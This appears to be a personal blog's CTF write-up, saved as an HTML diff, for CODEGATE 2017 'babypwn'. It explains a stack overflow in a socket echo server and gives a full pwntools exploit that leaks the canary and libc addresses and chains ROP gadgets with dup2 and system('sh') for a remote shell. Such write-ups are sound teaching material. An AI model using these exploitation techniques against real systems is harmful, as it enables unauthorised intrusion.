@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>  [CODEGATE CTF 2017] babypwn 50
+ | Naetw</title>
+
+    <meta name="author" content="Naetw"/>
+
+    <!-- Bootstrap -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css"/>
+    <link rel="stylesheet" href="naetw.github.io/theme/css/jquery.mglass.css"/>
+    <link rel="stylesheet" href="naetw.github.io/theme/css/pygment-solarized-dark.css"/>
+    <link rel="stylesheet" href="naetw.github.io/theme/css/style.css"/>
+
+    <!-- Fonts -->
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Istok+Web' rel='stylesheet' type='text/css'/>
+    <link href='https://fonts.googleapis.com/css?family=Droid+Sans+Mono' rel='stylesheet' type='text/css'/>
+
+
+    <link rel="icon" href="naetw.github.io/favicon.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="naetw.github.io/favicon.ico" type="image/x-icon">
+
+    <!-- Feeds -->
+
+
+  </head>
+
+  <body>
+
+    <div class="container">
+
+      <div class="page-header">
+        <h1><a href="naetw.github.io">Naetw</a> <small></small></h1>
+      </div>
+
+      <nav class="navbar navbar-default">
+
+        <!-- Hamburger menu for mobile -->
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#plumage-navbar-collapse-1" aria-expanded="false">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <a class="navbar-brand" href="naetw.github.io" title="">Naetw</a>
+        </div>
+
+        <!-- Menus and search forms -->
+        <div class="collapse navbar-collapse" id="plumage-navbar-collapse-1">
+
+          <ul class="nav navbar-nav">
+<li  class="active" >
+                  <a href="naetw.github.io/category/write-up.html">write-up <span class="sr-only">(current)</span></a>
+                </li>
+          </ul>
+
+
+
+        </div>
+
+      </nav>
+
+    </div>
+
+
+    <div class="container main">
+
+
+      <div class="row">
+        <div class=" col-md-9  ">
+  <h1>
+    <a href="naetw.github.io/codegate-ctf-2017-babypwn-50.html" rel="bookmark" title="Permalink to [CODEGATE CTF 2017] babypwn 50">[CODEGATE CTF 2017] babypwn 50</a>
+  </h1>
+        </div>
+      </div>
+
+      <div class="row">
+
+
+        <div class=" col-md-9 " id="content" role="main">
+  
+
+  <div>
+    <h2>Analyzing</h2>
+<p>32 bits ELF, Partial RELRO, with canary &amp; NX, no PIE.</p>
+<p>There is an obvious stack overflow vulnerablility, but this program uses <code>socket</code>, actually I haven't learned about socket programing so I won't talk too much about it, since all we need to do is dealing with file descriptor due to <code>fork</code>. </p>
+<p>Main operation is in <code>0x08048A71</code> function, and previous operation was setup of socket or sth. If you want to test this program locally:</p>
+<ul>
+<li>First run command <code>ncat -vc ./babypwn -kl 127.0.0.1 4000</code></li>
+<li>Second, after looking into the src, we need to <code>nc localhost 4000</code> first then our socket program will be started up. After that, we can test our program by port 8181(<code>nc localhost 8181</code>).</li>
+</ul>
+<p>The behavior of this program is simple:</p>
+<div class="highlight"><pre><span></span>===============================
+1. Echo
+2. Reverse Echo
+3. Exit
+===============================
+Select menu &gt; 1
+Input Your Message : AAAA
+AAAA
+
+===============================
+1. Echo
+2. Reverse Echo
+3. Exit
+===============================
+Select menu &gt;
+</pre></div>
+
+
+<p>Just an echo server, at first glance, I thought there was a format string vulnerablility, but it wasn't. It is just an echo server. However, we can overflow the stack when it takes the input. And we will use this vulnerablility to leak canary to do later exploit.</p>
+<h2>Exploit</h2>
+<p><strong>Overflow</strong></p>
+<p>I use ida pro.</p>
+<div class="highlight"><pre><span></span><span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span> <span class="c1">// [sp+24h] [bp-34h]@1</span>
+<span class="p">...</span>
+<span class="n">socket_recv</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span> <span class="c1">// socket_recv == 0x08048907</span>
+</pre></div>
+
+
+<p>Here is an obvious overflow. Therefore, we can calculate offset for canary then make buffer on stack look like this:</p>
+<div class="highlight"><pre><span></span><span class="mh">0xff951f54</span><span class="o">:</span>     <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
+<span class="mh">0xff951f64</span><span class="o">:</span>     <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>
+<span class="mh">0xff951f74</span><span class="o">:</span>     <span class="mh">0x41414141</span>      <span class="mh">0x41414141</span>      <span class="mh">0x4409b50a</span>      <span class="mh">0x00000000</span>
+</pre></div>
+
+
+<p><code>0x4409b50a</code> is our canary, since the first byte of canary would be '\x00', I use the newline to overwrite it so that we can leak the last 3 bytes. After we get the <code>0x4409b50a</code>, we just need to change newline back to null byte then we get the canary of this binary. So the real canary is <code>0x4409b500</code>.</p>
+<p>With canary, we can bypass the stack guard. I will use it to do the first ROP. In the first ROP, I will leak the file descriptor for the socket and the libc function address in order to get the version of libc by using <a href="http://libcdb.com">libc database</a>.</p>
+<p>First ROP payload:</p>
+<div class="highlight"><pre><span></span><span class="n">socket_send</span> <span class="o">=</span> <span class="mh">0x080488B1</span>
+<span class="n">pop1</span> <span class="o">=</span> <span class="mh">0x08048589</span>
+<span class="n">sigemptyset_got</span> <span class="o">=</span> <span class="mh">0x0804B048</span>
+<span class="n">echo_select</span> <span class="o">=</span> <span class="mh">0x08048A71</span>
+<span class="n">fd_address</span> <span class="o">=</span> <span class="mh">0x0804B1B8</span>
+<span class="n">rop1</span> <span class="o">=</span> <span class="p">[</span><span class="n">socket_send</span><span class="p">,</span> <span class="n">pop1</span><span class="p">,</span> <span class="n">sigemptyset_got</span><span class="p">,</span> 
+        <span class="n">socket_send</span><span class="p">,</span> <span class="n">echo_select</span><span class="p">,</span> <span class="n">fd_address</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span>      <span class="c1"># padding to canary</span>
+        <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span>
+        <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">12</span> <span class="o">+</span>        <span class="c1"># padding to return address</span>
+        <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">p32</span><span class="p">,</span> <span class="n">rop1</span><span class="p">))</span>
+</pre></div>
+
+
+<p>After placing the ROP gadgets, we need to choose choice 3 to return, then it will return to our ROP gadgets.</p>
+<p>I use the <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> to find the gadget <code>pop1</code> which pop once then ret. Since we need to do the second ROP(duplicate file descriptor and open the shell) after leaking information, I make the end of the first ROP return to the <code>0x08048A71</code>(function of main operation).</p>
+<p>After finding out the version of libc, we can get the libc base. In the second ROP, I will use <code>dup2</code> to copy the fd of socket to stdin and stdout then open the shell.(Use dup2 so that we can get the interactive shell)</p>
+<div class="highlight"><pre><span></span><span class="n">pop2</span> <span class="o">=</span> <span class="mh">0x08048B84</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">rop2</span> <span class="o">=</span> <span class="p">[</span><span class="n">dup2</span><span class="p">,</span> <span class="n">pop2</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
+        <span class="n">dup2</span><span class="p">,</span> <span class="n">pop2</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">system</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">sh</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span>      <span class="c1"># padding to canary</span>
+        <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span>
+        <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">12</span> <span class="o">+</span>        <span class="c1"># padding to return address</span>
+        <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">p32</span><span class="p">,</span> <span class="n">rop2</span><span class="p">))</span>
+</pre></div>
+
+
+<p>Again, choose the choice 3 to return then open the shell!</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding: utf8 -*-</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> <span class="c1"># pip install pwntools</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">ip</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">8181</span>
+<span class="n">reip</span> <span class="o">=</span> <span class="s1">&#39;110.10.212.130&#39;</span>
+<span class="n">report</span> <span class="o">=</span> <span class="mi">8888</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="c1">#r = remote(reip, report)</span>
+
+<span class="c1"># Default address &amp; libc setting</span>
+<span class="n">echo_select</span> <span class="o">=</span> <span class="mh">0x08048a71</span>
+<span class="n">socket_send</span> <span class="o">=</span> <span class="mh">0x080488b1</span>
+<span class="n">sigemptyset_got</span> <span class="o">=</span> <span class="mh">0x0804b048</span>
+<span class="n">fd</span> <span class="o">=</span> <span class="mh">0x0804b1b8</span>
+<span class="n">pop1</span> <span class="o">=</span> <span class="mh">0x08048589</span>
+<span class="n">pop2</span> <span class="o">=</span> <span class="mh">0x08048b84</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/i386-linux-gnu/libc.so.6&#39;</span><span class="p">)</span>
+<span class="c1">#libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
+<span class="c1">#libc = ELF(&#39;libc.so&#39;)</span>
+
+<span class="k">def</span> <span class="nf">echo</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Leak canary</span>
+<span class="n">echo</span><span class="p">(</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">40</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">canary</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+
+
+<span class="c1"># Leak libc function address and File Descripter</span>
+<span class="n">rop1</span> <span class="o">=</span> <span class="p">[</span><span class="n">socket_send</span><span class="p">,</span> <span class="n">pop1</span><span class="p">,</span> <span class="n">sigemptyset_got</span><span class="p">,</span> <span class="n">socket_send</span><span class="p">,</span> <span class="n">echo_select</span><span class="p">,</span> <span class="n">fd</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">12</span> <span class="o">+</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">p32</span><span class="p">,</span> <span class="n">rop1</span><span class="p">))</span>
+<span class="n">echo</span><span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span> 
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span> <span class="c1"># Use exit to ret to rop</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sig</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+<span class="n">listen</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+<span class="n">atoi</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+<span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">fd</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;sigemptyset : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">sig</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> 
+        <span class="s1">&#39;listen : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">listen</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span>
+        <span class="s1">&#39;atoi : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">atoi</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span>
+        <span class="s1">&#39;fd : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">fd</span><span class="p">))</span>
+
+<span class="sd">&#39;&#39;&#39; Here I use http://libcdb.com &#39;&#39;&#39;</span>
+<span class="n">base</span> <span class="o">=</span> <span class="n">atoi</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">]</span>
+<span class="n">dup2</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;dup2&#39;</span><span class="p">]</span>
+<span class="n">system</span> <span class="o">=</span> <span class="mh">0x08048620</span>
+<span class="n">read</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;base : &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="p">))</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+
+
+<span class="c1"># Duplicate fd and stdout &amp; stdin(in order to use shell)</span>
+<span class="n">rop2</span> <span class="o">=</span> <span class="p">[</span><span class="n">dup2</span><span class="p">,</span> <span class="n">pop2</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span>
+        <span class="n">dup2</span><span class="p">,</span> <span class="n">pop2</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span>
+        <span class="n">system</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">sh</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">12</span> <span class="o">+</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="n">p32</span><span class="p">,</span> <span class="n">rop2</span><span class="p">))</span>
+<span class="n">echo</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Use exit to ret to rop2</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+
+<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+
+
+<p><code>FLAG{GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^}</code></p>
+  </div>
+
+
+
+        </div>
+
+          <div class="col-md-3">
+  <div class="well">
+
+    <p><abbr title="2017-02-11T23:33:00+08:00"><i class="fa fa-calendar"></i> Sat 11 February 2017</abbr></p>
+
+      <p><address>
+        <i class="fa fa-user"></i> By
+          <a href="naetw.github.io/author/naetw.html" rel="author">Naetw</a>
+      </address></p>
+
+    <hr/>
+
+      <p>
+              <a href="naetw.github.io/category/write-up.html" rel="tag"
+                  data-toggle="tooltip" class="label label-info"
+                  title="1 article in this category">write-up</a>
+            <a href="/tag/codegate.html" data-toggle="tooltip"
+      class="label label-default"
+      title="1 article with this tag">CODEGATE</a>
+            <a href="/tag/ctf.html" data-toggle="tooltip"
+      class="label label-default"
+      title="1 article with this tag">CTF</a>
+            <a href="/tag/pwn.html" data-toggle="tooltip"
+      class="label label-default"
+      title="1 article with this tag">pwn</a>
+            <a href="/tag/rop.html" data-toggle="tooltip"
+      class="label label-default"
+      title="1 article with this tag">ROP</a>
+            <a href="/tag/stack-overflow.html" data-toggle="tooltip"
+      class="label label-default"
+      title="1 article with this tag">Stack Overflow</a>
+      </p>
+      <hr/>
+
+
+
+  </div>
+            
+          </div>
+
+      </div>
+
+    </div>
+
+    <!-- TODO: make footer sticky -->
+    <footer class="container-fluid">
+      <div class="container">
+        <div class="row">
+
+            <div class="col-md-2">
+                <h5>Social</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="#">
+      <i class="fa fa-external-link"></i>
+    You can add links in your config file
+  </a></li>
+                  <li>  <a href="#">
+      <i class="fa fa-external-link"></i>
+    Another social link
+  </a></li>
+                </ul>
+            </div>
+            <div class="col-md-2">
+                <h5>Links</h5>
+                <ul class="list-unstyled">
+                  <li>  <a href="http://getpelican.com/">
+      <img src="https://besticon-demo.herokuapp.com/icon?url=getpelican.com&size=16" width="16" height="16" class="icon" alt="getpelican.com icon"/>
+    Pelican
+  </a></li>
+                  <li>  <a href="http://python.org/">
+      <img src="https://besticon-demo.herokuapp.com/icon?url=python.org&size=16" width="16" height="16" class="icon" alt="python.org icon"/>
+    Python.org
+  </a></li>
+                  <li>  <a href="http://jinja.pocoo.org/">
+      <img src="https://besticon-demo.herokuapp.com/icon?url=jinja.pocoo.org&size=16" width="16" height="16" class="icon" alt="jinja.pocoo.org icon"/>
+    Jinja2
+  </a></li>
+                  <li>  <a href="#">
+      <i class="fa fa-external-link"></i>
+    You can modify those links in your config file
+  </a></li>
+                </ul>
+            </div>
+
+          <div class="col-md-2">
+            <h5>Browse content by</h5>
+            <ul class="list-unstyled">
+            </ul>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Copyright notice</h5>
+            <p>© Copyright 2017 Naetw.</p>
+          </div>
+
+          <div class="col-md-2 text-muted">
+            <h5>Disclaimer</h5>
+              <p>All opinions expressed in this site are my own personal opinions and are not endorsed by, nor do they represent the opinions of my previous, current and future employers or any of its affiliates, partners or customers.</p>
+          </div>
+
+          <div class="col-md-2">
+          </div>
+
+        </div>
+      </div>
+
+      <h5 class="text-right"><a href="#"><i class="fa fa-arrow-up"></i> Back to top</a></h5>
+
+      <div class="container">
+        <div class="row col-md-12 text-muted text-center">
+          Site generated by <a href="https://getpelican.com"> Pelican</a>.<br/>
+          <a href="https://github.com/kdeldycke/plumage"> Plumage</a> theme by <a href="https://kevin.deldycke.com">Kevin Deldycke</a>.
+        </div>
+      </div>
+
+    </footer>
+
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fitvids/1.1.0/jquery.fitvids.min.js"></script>
+    <script src="naetw.github.io/theme/js/jquery.mglass.js"></script>
+    <script src="naetw.github.io/theme/js/application.js"></script>
+
+  </body>
+</html>
